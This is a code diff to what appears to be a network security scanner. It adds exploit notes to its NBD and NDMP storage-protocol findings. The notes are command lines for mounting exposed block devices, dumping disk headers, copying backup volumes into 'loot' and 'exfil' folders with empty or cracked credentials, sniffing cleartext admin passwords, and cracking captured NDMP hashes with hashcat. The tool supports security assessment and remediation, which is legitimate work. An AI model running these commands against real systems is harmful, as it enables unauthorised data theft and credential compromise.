@@ -980,7 +980,11 @@ def _nbd_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "Restrict the NBD socket to a management VLAN, require TLS "
             "with a peer certificate, and prefer nbdkit + Unix-socket "
             "hand-off over network exposure.",
-            ["CWE-306", "CWE-200"], kind="nbd_export_list"))
+            ["CWE-306", "CWE-200"], kind="nbd_export_list",
+            exploit_note=(
+                f"nbd-client -l {ip} {port}  "
+                "# list every export by name and description"),
+            depth_tier="t1"))
     # Per-export write / fingerprint findings.
     writable = []
     fps = []
@@ -1007,7 +1011,11 @@ def _nbd_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "Serve the export read-only at the server (nbd-server: "
             "read only = true; qemu-nbd -r; nbdkit --readonly), and "
             "restrict the socket to a management VLAN.",
-            ["CWE-306", "CWE-732"], kind="nbd_export_writable"))
+            ["CWE-306", "CWE-732"], kind="nbd_export_writable",
+            exploit_note=(
+                f"modprobe nbd; nbd-client {ip} {port} -N <export> "
+                "/dev/nbd0; blockdev --getro /dev/nbd0  # 0 = writable"),
+            depth_tier="t1"))
     for fp in fps:
         out.append(_finding(
             "high", f"NBD export fingerprint reveals {fp['block0_label']}", tgt,
@@ -1019,7 +1027,12 @@ def _nbd_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             f"file -s /dev/nbd0",
             "Restrict the NBD socket to a management VLAN and require "
             "TLS + peer certificate.",
-            ["CWE-200"], kind="nbd_export_fingerprint"))
+            ["CWE-200"], kind="nbd_export_fingerprint",
+            exploit_note=(
+                f"nbd-client {ip} {port} -N <export> /dev/nbd0; "
+                "dd if=/dev/nbd0 bs=1M count=2 of=header.bin; "
+                "cryptsetup luksDump header.bin ; # or fsck -N /dev/nbd0"),
+            depth_tier="t2"))
     # TLS posture
     tls = pr.get("tls") or {}
     if tls and (not tls.get("tls_supported") or tls.get("list_before_tls")):
@@ -1057,7 +1070,11 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "# confirm CONFIG_GET_SERVER_INFO leaks without a valid auth",
             "Require AUTH_MD5 on every NDMP endpoint, disable AUTH_NONE and "
             "AUTH_TEXT, restrict to a dedicated backup VLAN.",
-            ["CWE-200", "CWE-306"], kind="ndmp_info_unauth"))
+            ["CWE-200", "CWE-306"], kind="ndmp_info_unauth",
+            exploit_note=(
+                f"ndmpcopy -sa root:'' {ip}:/ /tmp/dev-null-mock  "
+                "# if CONFIG_GET_SERVER_INFO returns pre-auth"),
+            depth_tier="t1"))
         if NDMP_AUTH_NONE in (si.get("auth_types") or []):
             out.append(_finding(
                 "critical",
@@ -1071,7 +1088,11 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
                 "ndmpcopy",
                 f"ndmpcopy -sa '' -da '' {ip}:/ /tmp/loot",
                 "Disable AUTH_NONE on every NDMP endpoint; require AUTH_MD5.",
-                ["CWE-306", "CWE-284"], kind="ndmp_unauth"))
+                ["CWE-306", "CWE-284"], kind="ndmp_unauth",
+                exploit_note=(
+                    f"ndmpcopy -sa '' -da '' {ip}:/vol/foo /tmp/loot ; "
+                    "# if it copies, backup control is unauth"),
+                depth_tier="t1"))
         if NDMP_AUTH_TEXT in (si.get("auth_types") or []):
             out.append(_finding(
                 "high", "NDMP AUTH_TEXT enabled (backup admin password cleartext)",
@@ -1083,7 +1104,12 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
                 "tcpdump",
                 f"tcpdump -i any -A 'host {ip} and port {port}'",
                 "Disable AUTH_TEXT on every NDMP endpoint; use AUTH_MD5.",
-                ["CWE-319", "CWE-522"], kind="ndmp_cleartext_auth"))
+                ["CWE-319", "CWE-522"], kind="ndmp_cleartext_auth",
+                exploit_note=(
+                    f"tcpdump -i any -A 'host {ip} and port 10000'  "
+                    "# capture the AUTH_TEXT cleartext credential when an "
+                    "admin logs in"),
+                depth_tier="t0"))
     hi = pr.get("host_info") or {}
     if hi.get("hostname"):
         detail = (f"hostname={hi.get('hostname','')} "
@@ -1096,7 +1122,11 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "ndmp", f"# recce parses HOST_INFO from CONNECT_OPEN + "
             f"CONFIG_GET_HOST_INFO on {ip}:{port}",
             "Restrict NDMP to a dedicated backup VLAN; require AUTH_MD5.",
-            ["CWE-200"], kind="ndmp_host_info"))
+            ["CWE-200"], kind="ndmp_host_info",
+            exploit_note=(
+                "review NDMP hostname/os/version fields; cross-check with "
+                "SMB/AD enum"),
+            depth_tier="t0"))
     fs = (pr.get("fs_info") or {}).get("filesystems") or []
     tapes = (pr.get("tape_info") or {}).get("tapes") or []
     scsi = (pr.get("scsi_info") or {}).get("scsi") or []
@@ -1114,7 +1144,11 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "ndmp", f"# recce enumerated {ip}:{port} pre-auth",
             "Require AUTH_MD5, disable AUTH_NONE + AUTH_TEXT, and restrict "
             "NDMP to a dedicated backup VLAN.",
-            ["CWE-200", "CWE-306"], kind="ndmp_inventory_leak"))
+            ["CWE-200", "CWE-306"], kind="ndmp_inventory_leak",
+            exploit_note=(
+                "review recce probe output for filesystem paths; then: "
+                f"ndmpcopy -sa <user>:<pass> {ip}:/<vol> -da root:'' /tmp/exfil"),
+            depth_tier="t1"))
     cap = pr.get("md5_capture") or {}
     if cap.get("captured"):
         line = hashcat_ndmp_md5_line(cap.get("username", ""),
@@ -1133,7 +1167,13 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "Rotate the backup admin password to a high-entropy value; "
             "restrict NDMP to a dedicated backup VLAN. There is no "
             "protocol-level fix - offline crackability is inherent.",
-            ["CWE-326", "CWE-916"], kind="ndmp_md5_challenge_capture"))
+            ["CWE-326", "CWE-916"], kind="ndmp_md5_challenge_capture",
+            exploit_note=(
+                "printf '%s\\n' \"<response>:<challenge>:<user>\" > "
+                "loot/ndmp.hash ; hashcat -m 50 loot/ndmp.hash "
+                "/usr/share/wordlists/rockyou.txt ; then ndmpcopy -sa "
+                f"<user>:<cracked> {ip}:/vol/... -da root:'' /tmp/loot"),
+            depth_tier="t2"))
     if pr.get("downgraded") and pr.get("version"):
         out.append(_finding(
             "medium", f"NDMP legacy protocol version negotiated (v{pr['version']})",
@@ -1161,7 +1201,11 @@ def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
             "Restrict NDMP + associated MOVER ports to a dedicated backup "
             "VLAN; enable AUTH_MD5 on the control channel; segment tape "
             "servers from user networks.",
-            ["CWE-306", "CWE-300"], kind="ndmp_session_hijack_surface"))
+            ["CWE-306", "CWE-300"], kind="ndmp_session_hijack_surface",
+            exploit_note=(
+                f"wireshark: tcp.port==10000 and ip.addr=={ip}  "
+                "# observe MOVER_LISTEN + connect to the returned data port"),
+            depth_tier="t0"))
     return out
 
 
